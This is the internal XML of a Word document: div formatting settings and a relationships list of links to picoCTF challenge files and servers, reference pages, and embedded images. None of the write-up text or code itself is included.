                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="1938902952">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
            <w:div w:id="19148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27279">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1085419656">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="2055425518">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="137189528">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1784228193">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1319655784">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1500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158">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1430158422">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>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sChild>
        </w:div>
        <w:div w:id="1658730630">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="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
          </w:divsChild>
        </w:div>
        <w:div w:id="1142425330">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="3329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31">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1297026672">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="380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7444">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2119720227">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1009985875">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1460299648">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1587837672">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1899003758">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="589312777">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="12992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179">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1656758643">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1278561184">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1065566934">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="962658756">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1720979337">
          <w:marLeft w:val="-225"/>
          <w:marRight w:val="-225"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="8142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artifacts.picoctf.net/c/60/level4.flag.txt.enc" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:21939/" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.png"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image29.png"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId107" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/38/fixme1.py" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.png"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image24.png"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://onlinephp.io/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image31.png"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ctftime.org/user/104836" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/60/level4.hash.bin" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/86/runme.py" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:44070/" TargetMode="External"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image22.png"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:11590/" TargetMode="External"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:49699/" TargetMode="External"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image52.png"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.png"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/67/fixme2.py" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/24/level3.py" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c" TargetMode="External"/><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35.png"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.png"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="view-source:http://mercury.picoctf.net:25395/index.phps" TargetMode="External"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image51.png"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.png"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:1270/" TargetMode="External"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/51d68e61bb41207a55f24e753f07c5a3/values" TargetMode="External"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://ctftime.org/team/147495" TargetMode="External"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.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jupiter.challenges.picoctf.org/static/5bd86036f013ac3b9c958499adf3e2e2/strings" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/level5.py" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/94/serpentine.py" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.mathstat.dal.ca/~selinger/md5collision/" TargetMode="External"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image45.png"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.png"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:44070/" TargetMode="External"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Date" TargetMode="External"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://awebanalysis.com/fr/ip-lookup/31.3.152.55/" TargetMode="External"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:19593/filter.php" TargetMode="External"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/51/level1.py" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/24/level3.flag.txt.enc" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:21939/" TargetMode="External"/><Relationship Id="rId109" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image39.png"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Two's_complement" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image14.png"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/41511/" TargetMode="External"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.png"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://factordb.com/" TargetMode="External"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:10868/" TargetMode="External"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image46.png"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:52683/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/495d43ee4a2b9f345a4307d053b4d88d/file" TargetMode="External"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://caas.mars.picoctf.net/" TargetMode="External"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/fd0e358d4b82695c220c0d6013c11484/crackme.py" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/551/files.zip" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/level5.flag.txt.enc" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:17781/" TargetMode="External"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:44070/" TargetMode="External"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.png"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.mathstat.dal.ca/~selinger/md5collision/" TargetMode="External"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:63504/" TargetMode="External"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/33850/" TargetMode="External"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:59300/" TargetMode="External"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.png"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/24/level3.hash.bin" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/51/level1.flag.txt.enc" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/554/big-zip-files.zip" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://jupiter.challenges.picoctf.org:41511" TargetMode="External"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent" TargetMode="External"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.png"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://en.wikipedia.org/wiki/Homomorphic_encryption" TargetMode="External"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image49.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/101/code.py" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js" TargetMode="External"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mercury.picoctf.net/static/a6d9cac3bfa4935ceb50c145d3ff5586/keygenme-trial.py" TargetMode="External"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/13594/" TargetMode="External"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image47.png"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/79/level5.hash.bin" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/36474/" TargetMode="External"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image43.png"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/60/level4.py" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.png"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/problem/37821/" TargetMode="External"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/DNT" TargetMode="External"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Accept-Language" TargetMode="External"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image41.png"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://mercury.picoctf.net:63504/filter.php" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/17/level2.py" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/b99c57e4274172bf3c93534b6d59632d/lyrics.txt" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://saturn.picoctf.net:49386/" TargetMode="External"/><Relationship Id="rId106" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image36.png"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image50.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://artifacts.picoctf.net/c/30/convertme.py" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://jupiter.challenges.picoctf.org/static/c594d8d915de0129d92b4c41e25a2313/lyrics.txt" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.png"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" 